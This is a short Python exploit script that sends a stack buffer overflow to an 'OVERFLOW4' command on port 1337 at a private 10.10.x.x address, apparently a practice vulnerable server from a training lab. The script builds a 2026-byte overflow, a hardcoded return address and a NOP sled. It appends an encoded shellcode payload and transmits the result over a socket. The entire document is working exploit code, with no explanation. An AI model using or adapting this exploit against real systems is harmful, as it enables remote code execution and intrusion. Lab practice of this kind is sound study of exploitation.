#!/usr/bin/env python3

import socket

ip = "10.10.60.34"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # 625011AF
padding = "\x90" * 16
payload = ("\xb8\x7e\x53\x81\x45\xda\xc1\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x47\x12\x83\xef\xfc\x03\x39\x5d\x63\xb0\x39\x89\xe1"
"\x3b\xc1\x4a\x86\xb2\x24\x7b\x86\xa1\x2d\x2c\x36\xa1\x63\xc1"
"\xbd\xe7\x97\x52\xb3\x2f\x98\xd3\x7e\x16\x97\xe4\xd3\x6a\xb6"
"\x66\x2e\xbf\x18\x56\xe1\xb2\x59\x9f\x1c\x3e\x0b\x48\x6a\xed"
"\xbb\xfd\x26\x2e\x30\x4d\xa6\x36\xa5\x06\xc9\x17\x78\x1c\x90"
"\xb7\x7b\xf1\xa8\xf1\x63\x16\x94\x48\x18\xec\x62\x4b\xc8\x3c"
"\x8a\xe0\x35\xf1\x79\xf8\x72\x36\x62\x8f\x8a\x44\x1f\x88\x49"
"\x36\xfb\x1d\x49\x90\x88\x86\xb5\x20\x5c\x50\x3e\x2e\x29\x16"
"\x18\x33\xac\xfb\x13\x4f\x25\xfa\xf3\xd9\x7d\xd9\xd7\x82\x26"
"\x40\x4e\x6f\x88\x7d\x90\xd0\x75\xd8\xdb\xfd\x62\x51\x86\x69"
"\x46\x58\x38\x6a\xc0\xeb\x4b\x58\x4f\x40\xc3\xd0\x18\x4e\x14"
"\x16\x33\x36\x8a\xe9\xbc\x47\x83\x2d\xe8\x17\xbb\x84\x91\xf3"
"\x3b\x28\x44\x53\x6b\x86\x37\x14\xdb\x66\xe8\xfc\x31\x69\xd7"
"\x1d\x3a\xa3\x70\xb7\xc1\x24\x75\x4c\xe1\x6c\xe1\x4e\xf1\x9d"
"\xae\xc7\x17\xf7\x5e\x8e\x80\x60\xc6\x8b\x5a\x10\x07\x06\x27"
"\x12\x83\xa5\xd8\xdd\x64\xc3\xca\x8a\x84\x9e\xb0\x1d\x9a\x34"
"\xdc\xc2\x09\xd3\x1c\x8c\x31\x4c\x4b\xd9\x84\x85\x19\xf7\xbf"
"\x3f\x3f\x0a\x59\x07\xfb\xd1\x9a\x86\x02\x97\xa7\xac\x14\x61"
"\x27\xe9\x40\x3d\x7e\xa7\x3e\xfb\x28\x09\xe8\x55\x86\xc3\x7c"
"\x23\xe4\xd3\xfa\x2c\x21\xa2\xe2\x9d\x9c\xf3\x1d\x11\x49\xf4"
"\x66\x4f\xe9\xfb\xbd\xcb\x09\x1e\x17\x26\xa2\x87\xf2\x8b\xaf"
"\x37\x29\xcf\xc9\xbb\xdb\xb0\x2d\xa3\xae\xb5\x6a\x63\x43\xc4"
"\xe3\x06\x63\x7b\x03\x03")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")